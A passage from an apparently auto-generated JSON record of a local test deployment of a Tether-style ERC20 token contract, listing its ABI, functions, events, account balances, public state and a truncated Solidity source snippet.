       {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x67B5656d60a809915323Bf2C40A8bEF15A152e3e": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public 